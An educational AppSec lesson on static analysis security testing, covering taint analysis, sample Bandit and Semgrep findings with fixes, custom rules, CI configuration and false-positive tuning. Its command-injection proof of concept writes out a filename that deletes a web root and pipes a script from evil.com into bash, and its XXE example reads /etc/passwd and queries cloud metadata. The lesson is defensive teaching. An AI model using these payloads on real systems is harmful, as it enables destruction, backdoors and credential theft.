SAST
Static Analysis
Security Testing

SAST is the practice of analyzing your source code, bytecode, or binary — without executing it — to find security vulnerabilities. It's the earliest automated security gate in your pipeline, running on every commit. This lesson takes you from "what does SAST even do?" to writing custom rules, tuning false positives, and integrating it into CI/CD so nothing insecure can ship.

🟢 Beginner — Level 1
What is SAST and how does it work?
SAST reads your code like a compiler reads it — as a data structure, not as a running program. Understanding this is fundamental to understanding what SAST can and cannot find.

A human security reviewer reading code looks for patterns: "this function takes user input and passes it directly to the database — that's a SQL injection." SAST tools automate exactly that process. They parse your code into a structured representation and then run rules against that structure to find dangerous patterns.

ℹ️
The key distinction — static vs dynamic: SAST analyzes code without executing it. This means it runs before you even have a running server, before any database connection, before any user input. It can find vulnerabilities in code paths that are rarely triggered in testing — including edge cases and error handlers that never fire in normal use.
How SAST reads code — Abstract Syntax Trees (ASTs)
This is the internal representation every SAST tool uses
▼

When you write username = request.args.get('name'), SAST doesn't see a string of text. It parses it into an Abstract Syntax Tree (AST) — a structured tree where every element of your code becomes a node with defined relationships.

What an AST looks like for a vulnerable line

# Source code:
query = "SELECT * FROM users WHERE name='" + username + "'"

# What SAST sees — the AST (simplified):
Assignment
  ├── target: Variable("query")
  └── value: BinaryOp("+")
        ├── left: BinaryOp("+")
        │     ├── left: StringLiteral("SELECT * FROM users WHERE name='")
        │     └── right: Variable("username")    ← SAST notes: is this tainted?
        └── right: StringLiteral("'")

# SAST rule asks: "Is a tainted variable being concatenated into a SQL string?"
# Answer: YES → FINDING: SQL Injection (CWE-89) — HIGH severity

Rules are written against this AST structure — not against the raw text. This is why SAST is smarter than a simple grep: it understands code structure, scope, and data types. A grep for "SELECT" would miss injections in functions. SAST follows the actual variable from assignment to use.

The 3 analysis techniques SAST tools use

TechniqueWhat it doesFindsLimitation
Pattern matching Matches AST patterns — e.g., "call to subprocess.call() with shell=True" Known-bad API usage, dangerous function calls, hardcoded strings Only finds what rules explicitly look for. Misses novel patterns.
Taint analysis Tracks user-controlled data from source (input) to sink (dangerous use). Flags when tainted data reaches a sink without sanitization. SQLi, XSS, command injection, path traversal, SSRF, XXE Can miss flows through complex OOP, reflection, or dynamic dispatch.
Data flow / control flow analysis Builds a graph of all possible execution paths and data values at each point Dead code with vulns, unreachable sanitization, conditional auth bypasses Path-sensitive analysis is computationally expensive; many tools approximate.
Taint analysis — following user data through your code
The most powerful SAST technique — and the one behind every injection finding
▼

Taint analysis models the flow of untrusted (tainted) data through your program. It starts at sources (where untrusted data enters), follows it through every assignment and function call, and checks whether it reaches a sink (a dangerous operation) without passing through a sanitizer (a function that makes it safe).

Sources, Sinks, and Sanitizers

ConceptDefinitionExamples
Source Where untrusted data enters your program from the outside world request.args, request.form, request.json, HTTP headers, URL path params, file upload contents, environment variables set by user, WebSocket messages
Sink A dangerous operation that, if given attacker-controlled input, causes a vulnerability SQL: db.execute(query) · OS: subprocess.call(cmd) · HTML: render_template_string(html) · File: open(path) · URL: requests.get(url) · Deserialize: pickle.loads(data)
Sanitizer A function that neutralizes the taint — makes data safe for a specific sink SQL: parameterized query (removes taint) · HTML: markupsafe.escape() · OS: allowlist validation · File: os.path.basename() + allowlist

Full taint flow — vulnerable path

# Taint analysis traces this entire flow:

from flask import request
import sqlite3

@app.route('/search')
def search():
    term = request.args.get('q')           # ← SOURCE: tainted data enters here
    results = search_db(term)               # ← taint propagates into function
    return jsonify(results)

def search_db(term):                        # ← taint arrives here as parameter
    query = f"SELECT * FROM products WHERE name LIKE '%{term}%'"
    conn = sqlite3.connect('db.sqlite')
    return conn.execute(query).fetchall()   # ← SINK: tainted data reaches execute()
                                            # ← No sanitizer between source and sink
                                            # ← FINDING: SQL Injection — CWE-89 HIGH

Same flow — sanitized (taint cleared)

def search_db_fixed(term):
    query = "SELECT * FROM products WHERE name LIKE ?"
    conn  = sqlite3.connect('db.sqlite')
    return conn.execute(query, (f'%{term}%',)).fetchall()  # ← SANITIZER: parameterized
    # Taint analysis sees: tainted 'term' passed to execute() as PARAMETER not in query string
    # The parameterized query breaks the injection → taint cleared → NO FINDING
💡
Why this matters for you as an AppSec engineer: When you see a SAST finding, your job is to trace the taint flow yourself — from source to sink — and verify it's real (not a false positive). Then specify the sanitizer that breaks the chain. This is the core skill of reading and triaging SAST output, which you'll do hundreds of times in your career.
What SAST can and cannot find — know the limits
Every tool has blind spots. Knowing them makes you a better security engineer.
▼
✅ SAST finds these well
  • SQL injection via string concatenation
  • Command injection (shell=True, os.system)
  • Hardcoded passwords, API keys, secrets
  • Weak crypto (MD5, SHA1, DES, ECB mode)
  • Insecure deserialization (pickle.loads)
  • Reflected XSS (user input → response)
  • Path traversal (open(user_input))
  • SSRF (requests.get(user_url))
  • Use of dangerous functions (eval, exec)
  • Missing security headers, misconfigs in code
❌ SAST misses these (need DAST/manual)
  • Business logic flaws (charging $0 for items)
  • IDOR / Broken access control (runtime auth)
  • Authentication bypass requiring live session
  • Race conditions and TOCTOU bugs
  • Second-order injection (stored, then executed)
  • Vulnerabilities in third-party libraries
  • Runtime misconfigurations (server headers)
  • Zero-day vulnerabilities (no rule exists yet)
  • Complex multi-request attack flows
  • Vulnerabilities only visible at runtime
⚠️
SAST is one layer — not the whole defence: No single tool covers everything. SAST + DAST + SCA + manual code review + pentesting work together in layers. An AppSec engineer who relies on SAST alone will miss entire categories of vulnerabilities. You need all the tools — that's why this curriculum has 20 lessons.

B602 — subprocess.call() with shell=True using user-controlled input
src/utils/file_processor.py:47 · Bandit B602 · CWE-78 OS Command Injection
CRITICAL
Vulnerable Code
# file_processor.py — line 47
def convert_image(filename):
    # Converts uploaded image to PNG using ImageMagick
    cmd = f"convert {filename} output.png"
    subprocess.call(cmd, shell=True)   # ← B602: shell=True + user input
Why It's Critical

The filename parameter comes from a user-uploaded file name. With shell=True, the entire string is passed to /bin/sh -c. An attacker names their file photo.jpg; curl http://evil.com/shell.sh | bash — the shell executes the semicolon as a command separator and runs the attacker's shell script. This is Remote Code Execution (RCE) — complete server compromise.

Attack Proof of Concept
# Attacker uploads file with name:
filename = "photo.jpg; rm -rf /var/www/html && curl http://evil.com/backdoor.sh | bash"

# Shell executes:
# $ convert photo.jpg; rm -rf /var/www/html && curl http://evil.com/backdoor.sh | bash
# → web root deleted, backdoor installed
Fix
import subprocess, os, re

def convert_image_fixed(filename):
    # Fix 1: validate filename with allowlist BEFORE use
    if not re.match(r'^[\w\-. ]+\.(jpg|jpeg|png|gif|webp)$', filename):
        raise ValueError("Invalid filename")
    # Fix 2: pass as list — no shell, no injection
    subprocess.run(                         # ← shell=False (default)
        ["convert", filename, "output.png"],  # ← list → no shell interpolation
        check=True,
        timeout=30
    )
Verdict
TRUE POSITIVEFix immediately — P0CWE-78OWASP A03 Injection
B324 — Use of MD5 or SHA1 hash function
src/auth/password.py:12 · Bandit B324 · CWE-327 Weak Cryptographic Algorithm
HIGH
Vulnerable Code
import hashlib

def hash_password(password: str) -> str:
    return hashlib.md5(password.encode()).hexdigest()   # ← B324: MD5 is broken for passwords
Why It's High Severity

MD5 produces a 128-bit hash. Modern GPUs can compute 50 billion MD5 hashes per second. A password like "password123" in an MD5 hash database would be cracked in milliseconds using a rainbow table lookup. After a database breach, every MD5-hashed password in the database is effectively plaintext.

The Numbers

MD5~150 billion/secMilliseconds (rainbow table)Never use for passwords
SHA-256~20 billion/secSeconds to minutes (GPU farm)Never use for passwords
bcrypt (cost=10)~184/secThousands of yearsMinimum acceptable
bcrypt (cost=12)~46/secEssentially impossibleRecommended
Argon2idConfigurableEssentially impossible (memory-hard)Best in class
Fix
import bcrypt

def hash_password_fixed(password: str) -> bytes:
    salt = bcrypt.gensalt(rounds=12)               # auto-generates unique salt
    return bcrypt.hashpw(password.encode(), salt)    # work factor = 2^12 iterations

def verify_password(password: str, hashed: bytes) -> bool:
    return bcrypt.checkpw(password.encode(), hashed)  # constant-time comparison built in
TRUE POSITIVEFix in current sprint — P1CWE-327OWASP A02
B105 — Hardcoded password string assignment
config/settings.py:8 · Bandit B105 · CWE-259 Hard-coded Password
HIGH
Vulnerable Code
# config/settings.py
SECRET_KEY = "django-insecure-abc123xyz789"   # ← B105: hardcoded secret
DATABASE_PASSWORD = "P@ssw0rd!123"             # ← B105: hardcoded DB password
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG"        # ← B105: hardcoded AWS credentials
Why It's High Severity

Any developer with git access — or anyone who ever forks/clones the repo — has these credentials. Even if you delete them later, they exist in git history forever. Automated scanners (TruffleHog, GitLeaks) continuously scan GitHub for these patterns. Within minutes of a repo becoming public, bots collect and use leaked credentials. The AWS key above could be used to spin up EC2 instances, mine cryptocurrency, or exfiltrate data — all billed to you.

Fix
# config/settings.py — fixed
import os

SECRET_KEY      = os.environ['DJANGO_SECRET_KEY']      # raises KeyError if missing — intentional
DATABASE_PASSWORD = os.environ['DB_PASSWORD']
AWS_SECRET_KEY  = os.environ['AWS_SECRET_ACCESS_KEY']

# For production: use HashiCorp Vault or AWS Secrets Manager
# For local dev: use .env file with python-dotenv (add .env to .gitignore!)
# NEVER: store defaults in code, even "dev-only" ones
TRUE POSITIVERotate credentials NOW + fix code — P0CWE-259
B301 — Use of pickle.loads() — possible insecure deserialization
src/cache/session_cache.py:33 · Bandit B301 · CWE-502
MEDIUM
Flagged Code
# session_cache.py — line 33
import pickle
import redis

r = redis.Redis()

def load_session(session_id: str):
    data = r.get(f"session:{session_id}")
    return pickle.loads(data) if data else None   # ← B301: pickle.loads flagged
Triage — Is This a Real Vulnerability?

This requires investigation. Pickle deserialization is dangerous when the data being deserialized can be controlled by an attacker. The question is: can an attacker control what's in session:{session_id} in Redis?

Scenario A — FALSE POSITIVE: Redis is on a private subnet with no external access. Only your application writes to it. Session IDs are cryptographically random 128-bit values, not guessable. An attacker cannot write arbitrary data to Redis → the pickle data is trusted → the risk is low → this is a false positive for this specific deployment.

Scenario B — TRUE POSITIVE: Redis is on the same host as the web server, exposed on 0.0.0.0:6379 with no auth (default Redis config). An attacker who reaches the network can SET session:anyid to a malicious pickle payload, then trigger load_session() → RCE.

How to Resolve
# Check Redis exposure — run this on the server:
$ redis-cli ping              # if returns PONG from public IP → EXPOSED!
$ netstat -tlnp | grep 6379   # should show 127.0.0.1:6379, NOT 0.0.0.0:6379

# Best fix regardless: replace pickle with JSON for session data
import json

def save_session(session_id: str, data: dict):
    r.set(f"session:{session_id}", json.dumps(data), ex=3600)  # JSON is safe

def load_session(session_id: str):
    data = r.get(f"session:{session_id}")
    return json.loads(data) if data else None                # JSON cannot execute code
Verdict
CONTEXT-DEPENDENTSuppressed if Redis private + auth requiredFix recommended: replace pickle → JSON

Document in your suppression file: # nosec B301 — Redis on private subnet, no external access, monitored by VPC security group. Ticket #4521 to migrate to JSON.

G401 — Use of unsafe XML parsing — XXE vulnerability
src/parsers/invoice_parser.py:22 · Semgrep xml.etree · CWE-611 XXE
HIGH
Vulnerable Code
# invoice_parser.py — parsing customer-uploaded invoices
import xml.etree.ElementTree as ET

def parse_invoice(xml_data: str):
    tree = ET.fromstring(xml_data)   # ← Vulnerable to XXE (XML External Entity)
    return {
        'vendor': tree.find('vendor').text,
        'amount': tree.find('amount').text,
    }
Why It's High Severity — The XXE Attack

XML External Entities (XXE) allow an attacker to include external files or URLs in their XML payload. When your parser processes the XML, it fetches the external entity — which can be a local file (/etc/passwd), an internal network URL (SSRF), or even a billion-byte string that crashes your server (Billion Laughs DoS).

<!-- Attacker's malicious invoice XML: -->
<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">   <!-- reads local file -->
  <!-- OR: SYSTEM "http://169.254.169.254/latest/meta-data/" → SSRF -->
]>
<invoice>
  <vendor>&xxe;</vendor>   <!-- parser inserts /etc/passwd content here -->
  <amount>100</amount>
</invoice>
<!-- Response: {"vendor": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...", ...} -->
Fix — Disable External Entity Processing
# Python's xml.etree.ElementTree is safe by default from Python 3.8+
# BUT lxml is NOT safe by default — you must explicitly disable XXE
from lxml import etree

def parse_invoice_fixed(xml_data: bytes):
    parser = etree.XMLParser(
        resolve_entities=False,  # ← disable external entity resolution
        no_network=True,          # ← block network access from XML parser
        huge_tree=False           # ← prevent Billion Laughs DoS
    )
    tree = etree.fromstring(xml_data, parser)
    return {
        'vendor': tree.find('vendor').text,
        'amount': tree.find('amount').text,
    }
TRUE POSITIVEFix immediately — P1CWE-611OWASP A05
🔴 Advanced — Writing Custom SAST Rules
Writing Semgrep rules from scratch
Built-in rules cover common patterns. Custom rules cover YOUR codebase's specific risks — internal frameworks, proprietary APIs, business-logic-adjacent security checks. Writing them is a core AppSec skill.
ℹ️
Why custom rules matter: If your team uses an internal ORM wrapper called db.raw_query(), no built-in Semgrep rule will flag dangerous usage of it. You must write one. Custom rules are also how you encode your organization's specific security standards — "all HTTP requests must use our internal SecureRequests client, never requests directly."
Semgrep rule anatomy — every field explained
A Semgrep rule is a YAML file. Here is every field you need to know.
▼
# Complete Semgrep rule — annotated
rules:
  - id: no-raw-sql-concatenation                  # unique ID — used in suppressions
    message: "SQL injection: user input concatenated into query. Use parameterized queries."
    severity: ERROR                                 # ERROR/WARNING/INFO
    languages: [python]                             # which language this rule applies to
    metadata:
      category: security
      cwe: CWE-89
      owasp: A03:2021 - Injection
      confidence: HIGH                               # HIGH/MEDIUM/LOW — helps triage
    patterns:                                       # ALL patterns must match (AND logic)
      - pattern: |
          $QUERY = "..." + $VAR                     # matches: query = "SELECT..." + var
      - pattern-either:                             # ANY of these match (OR logic)
          - pattern: db.execute($QUERY)
          - pattern: cursor.execute($QUERY)
          - pattern: conn.execute($QUERY)
      - pattern-not: |                              # EXCLUDE false positives
          $QUERY = "..." + STATIC_CONSTANT            # allow: query + compile-time constant
    fix: |                                          # auto-fix suggestion (optional)
      db.execute("SELECT * FROM users WHERE id = %s", ($VAR,))

Pattern operators — the full set

OperatorMeaningExample use
patternSingle pattern must match exactlyMatch a specific function call pattern
patterns (AND)ALL sub-patterns must match in same code blockMatch function call AND it uses a tainted variable
pattern-either (OR)ANY sub-pattern matchesMatch db.execute() OR cursor.execute() OR conn.execute()
pattern-notExclude matches where this sub-pattern also matchesExclude calls that use a sanitizer
pattern-insideMatch only inside a specific contextOnly flag inside functions decorated with @app.route
pattern-not-insideExclude matches inside a specific contextDon't flag inside test files

Custom Rule 1 — Detect missing @login_required on Flask routes
A company-specific rule: all routes must be decorated with @login_required unless explicitly exempted
▼

Your company policy: every Flask route must be authenticated. Routes accessible without auth must be explicitly tagged # noauth-ok. This rule flags any @app.route that doesn't also have @login_required.

rules:
  - id: flask-route-missing-auth
    message: "Flask route lacks @login_required. Add it or document why auth is not needed."
    severity: WARNING
    languages: [python]
    metadata:
      cwe: CWE-306
      owasp: A01:2021 - Broken Access Control
      confidence: MEDIUM
    patterns:
      - pattern-inside: |
          @app.route(...)
          def $FUNC(...):
              ...
      - pattern-not-inside: |
          @login_required        # exclude: has @login_required somewhere above
          ...
          def $FUNC(...):
              ...

# Catches:
@app.route('/admin/users')          # ← FLAGGED: no @login_required
def get_all_users():
    return jsonify(User.query.all())

# Does NOT catch (correct):
@app.route('/admin/users')
@login_required                     # ← has auth decorator → no finding
def get_all_users():
    return jsonify(User.query.all())
Custom Rule 2 — Detect use of requests.get() instead of internal SecureHTTP client
Enforce your org's security wrapper: all outbound HTTP must use SecureHTTP to prevent SSRF
▼

Your org has a SecureHTTP wrapper that validates URLs against an allowlist before making requests (preventing SSRF). Policy: no direct use of requests library. SAST enforces this policy automatically.

rules:
  - id: use-secure-http-client
    message: "Direct use of requests library is prohibited. Use SecureHTTP from utils.http to prevent SSRF."
    severity: ERROR
    languages: [python]
    metadata:
      cwe: CWE-918
      owasp: A10:2021 - SSRF
    pattern-either:
      - pattern: requests.get(...)
      - pattern: requests.post(...)
      - pattern: requests.put(...)
      - pattern: requests.delete(...)
      - pattern: requests.request(...)
      - pattern: httpx.get(...)         # also covers httpx library
      - pattern: httpx.post(...)
    pattern-not-inside: |
      # Allow usage inside the SecureHTTP implementation itself
      class SecureHTTP:
          ...

# Usage in tests is allowed via path filter in CI config:
# exclude: ["**/tests/**", "**/test_*.py"]
Custom Rule 3 — Detect eval() and exec() with any non-literal argument
eval/exec with user-supplied input is Remote Code Execution waiting to happen
▼
rules:
  - id: dangerous-eval-exec
    message: "eval()/exec() with non-literal argument. If user input reaches this, it's RCE."
    severity: ERROR
    languages: [python]
    metadata:
      cwe: CWE-95
      confidence: HIGH
    patterns:
      - pattern-either:
          - pattern: eval($X)
          - pattern: exec($X)
      - pattern-not: eval("...")     # allow: eval("2 + 2") — compile-time literal
      - pattern-not: exec("...")     # allow: exec("pass") — literal string

# Catches all of these:
eval(user_input)                    # ← obvious
eval(request.json['formula'])       # ← tainted source
code = get_user_template()          # ← indirect
eval(code)                          # ← still caught

# Does NOT catch (allowed):
eval("2 + 2")                       # ← compile-time literal, not user-controlled
🔴 Advanced — CI/CD Integration
SAST in your CI/CD pipeline — full configuration
SAST only delivers value if it runs automatically on every commit and blocks the pipeline on real findings. Here is the complete setup for a production-grade SAST CI gate.
Stage 1
Pre-commit
Developer's machine
Fastest feedback. Runs Bandit + detect-secrets before any code reaches git. Developer fixes issues locally — no CI queue wait. Can be bypassed with --no-verify, so not the enforcement layer.
Stage 2
Pull Request
CI — cannot bypass
The real enforcement gate. Runs full Semgrep scan on changed files. Posts inline PR comments on findings. Blocks merge if HIGH or CRITICAL findings exist. Developers see findings before code review even starts.
Stage 3
Merge to Main
Full codebase scan
Full codebase scan — not just changed files. Catches regressions where a new file creates a vulnerable pattern with an existing file. Slower (5–15 min) but comprehensive. Results pushed to SonarQube dashboard for trend tracking.
Stage 4
Nightly
Deep scan + new rules
Full CodeQL analysis — the most thorough but slowest (can take 30+ minutes). Runs updated rule packs to catch issues with newly published CVE patterns. Results to security team inbox as a daily digest. Also runs custom org rules against full history.
Stage 5
Pre-release Gate
Hard block on deploy
Final hard gate: zero HIGH or CRITICAL findings allowed. Any unresolved HIGH+ finding blocks deployment to production. All suppressions must have an approved risk acceptance ticket number. Security lead must manually approve exceptions.
Complete GitHub Actions Configuration
# .github/workflows/sast.yml
name: SAST Security Scan

on:
  pull_request: { branches: [main, production] }
  push: { branches: [main] }
  schedule:
    - cron: '0 2 * * *'    # nightly at 2am UTC

jobs:

  # ─── Gate 1: Bandit — Python SAST ───────────────────────────────
  bandit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.12' }

      - name: Install Bandit
        run: pip install bandit[toml]

      - name: Run Bandit SAST
        run: |
          bandit -r src/ \
            -c pyproject.toml \        # your config file (suppression list lives here)
            -f json \
            -o bandit-results.json \
            --exit-zero                # don't fail here — custom threshold below

      - name: Enforce severity threshold
        run: |
          HIGH=$(jq '[.results[] | select(.issue_severity=="HIGH")] | length' bandit-results.json)
          CRIT=$(jq '[.results[] | select(.issue_severity=="CRITICAL")] | length' bandit-results.json)
          echo "HIGH: $HIGH  CRITICAL: $CRIT"
          if [ $((HIGH + CRIT)) -gt 0 ]; then
            echo "::error::SAST gate failed — $CRIT critical, $HIGH high findings"
            exit 1
          fi

      - name: Upload results as artifact
        uses: actions/upload-artifact@v4
        if: always()                   # upload even on failure
        with:
          name: bandit-results
          path: bandit-results.json

  # ─── Gate 2: Semgrep — Multi-language SAST ──────────────────────
  semgrep:
    runs-on: ubuntu-latest
    container:
      image: semgrep/semgrep
    steps:
      - uses: actions/checkout@v4

      - name: Run Semgrep with OWASP Top 10 rules
        run: |
          semgrep \
            --config p/owasp-top-ten \      # OWASP Top 10 rule pack
            --config p/python \             # Python security rules
            --config p/secrets \            # secret detection
            --config .semgrep/             \ # your custom rules directory
            --severity ERROR \              # only surface ERROR severity
            --error \                       # exit non-zero on findings
            --json \
            -o semgrep-results.json \
            --exclude "tests/" \            # don't scan test files
            --exclude "migrations/"         # don't scan DB migrations

      - name: Post PR comments on findings
        uses: actions/github-script@v7
        if: failure() && github.event_name == 'pull_request'
        with:
          script: |
            const fs = require('fs');
            const results = JSON.parse(fs.readFileSync('semgrep-results.json'));
            for (const finding of results.results.slice(0, 10)) {  // max 10 comments
              await github.rest.pulls.createReviewComment({
                owner: context.repo.owner,
                repo: context.repo.repo,
                pull_number: context.issue.number,
                body: `🔴 **SAST Finding**: ${finding.check_id}\n${finding.extra.message}`,
                path: finding.path,
                line: finding.start.line
              });
            }

  # ─── Gate 3: CodeQL — Deep analysis (runs on push to main) ──────
  codeql:
    runs-on: ubuntu-latest
    if: github.event_name == 'push' || github.event_name == 'schedule'
    permissions:
      security-events: write    # required for CodeQL
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with:
          languages: python
          queries: security-extended    # extended security query pack
      - uses: github/codeql-action/autobuild@v3
      - uses: github/codeql-action/analyze@v3
        with:
          category: /language:python
          upload: true           # uploads to GitHub Security tab
🔴 Advanced — Suppression & Tuning
Managing false positives — keeping signal high
A SAST tool generating 400 weekly findings that are mostly false positives is worse than no SAST at all — it trains your team to ignore security alerts. Tuning is as important as scanning.
⚠️
Alert fatigue is the #1 reason SAST programs fail: When developers see 400 findings and know 350 are false positives, they stop reading them entirely. Then the 50 real findings get missed too. Your job as AppSec engineer is to maintain a false positive rate below 20% — otherwise your tool is producing noise, not signal.
Inline suppressions — per-line and per-file
When a finding is confirmed false positive, suppress it with documentation
▼
# Bandit: suppress a specific finding on one line
result = hashlib.md5(data).hexdigest()  # nosec B324 — MD5 used for non-security cache key, not passwords

# Bandit: suppress multiple rules on one line
subprocess.call(cmd, shell=True)  # nosec B602,B603 — cmd constructed from config file only, not user input

# Semgrep: suppress on next line
# nosemgrep: use-secure-http-client
response = requests.get(INTERNAL_HEALTH_CHECK_URL)  # hardcoded URL, not user-controlled

# IMPORTANT: suppressions must explain WHY they are safe
# "nosec" with no comment = rejected in code review
# Good: # nosec B324 — MD5 for cache key fingerprint, not used for authentication or passwords
# Bad:  # nosec  ← explains nothing, could be lazy suppression of real vuln

Baseline suppression — ignoring existing technical debt

# When first adding SAST to an existing codebase,
# you'll have hundreds of findings in legacy code.
# Create a baseline to only surface NEW findings from now on.

# Semgrep: generate baseline
$ semgrep --config p/owasp-top-ten --json > .semgrep-baseline.json

Knowledge Check
SAST interview questions
Every AppSec interview includes at least one SAST question — usually about false positives or tool selection
Q1. A developer asks you: "I see a Bandit finding B601 — SQL injection — but we're using SQLAlchemy ORM. How can there be a SQL injection?" What is your answer?
It's definitely a false positive — SQLAlchemy ORM is completely safe from SQL injection by design
SQLAlchemy ORM is safe when you use ORM query methods. But SQLAlchemy also supports raw SQL via text() and execute() — if you build those strings with f-strings or concatenation, you have SQLi even with SQLAlchemy. Show me the line number and we'll check.
Suppress the finding — ORMs prevent SQL injection completely
Replace SQLAlchemy with a different ORM that doesn't have this problem
This is a critical distinction. SQLAlchemy ORM methods like User.query.filter_by(name=name) are safe — they parameterize automatically. But db.execute(text(f"SELECT * FROM users WHERE name='{name}'")) is not safe — you've bypassed ORM safety. SAST tools flag the latter correctly. The real answer: investigate the specific line. Never suppress without checking.
Q2. Your SAST scan is running in CI and producing 300 findings per week. Developers have stopped reading the reports. What are the 4 steps you take to fix this situation?
Remove SAST from CI — it's creating too much friction and reducing developer productivity
Make all findings mandatory to fix before merge — this forces developers to engage
1) Create a baseline to suppress existing findings — only surface NEW ones. 2) Increase severity threshold to MEDIUM+ — suppress LOW. 3) Write suppression docs for confirmed false positives. 4) Block merge only on CRITICAL/HIGH — MEDIUM goes to backlog. Result: ~10 actionable findings/week instead of 300.
Switch to a different SAST tool that has fewer findings
Alert fatigue is a process problem, not a tool problem. The solution is signal-to-noise management: (1) Baseline all existing findings so you only flag new regressions. (2) Severity filtering — only surface what matters. (3) False positive suppression with # nosec and documented justification. (4) Gate only on HIGH+ — MEDIUM findings become sprint backlog items, not merge blockers. Target: developers see 5–15 actionable findings per week maximum.
Q3. What is taint analysis, and why does SAST using taint analysis find more vulnerabilities than pattern-matching only?
Taint analysis checks for code smells and style issues. Pattern matching finds security vulnerabilities.
Taint analysis scans the running application's memory. Pattern matching scans source code.
Taint analysis tracks user-controlled data from sources (request.args) through all assignments and function calls to sinks (db.execute). Pattern matching only finds vulnerabilities where the source and sink are on the same line or in obvious proximity. Taint analysis finds multi-hop flows — where user input passes through 3 functions before reaching the sink.
They are equivalent — taint analysis is just a more modern term for pattern matching.
Pattern matching: if db.execute("..." + user_input) then flag. Works for simple cases. Misses: sanitized = sanitize(user_input); result = wrap(sanitized); db.execute(result) — is it actually sanitized? Taint analysis follows the variable: user_input → sanitize() → does sanitize() clear the taint? If yes, no finding. If no (e.g., sanitize() only strips spaces, not SQL metacharacters), the taint continues → finding. This is why CodeQL (full taint analysis) finds real vulnerabilities that Bandit (pattern matching) misses.
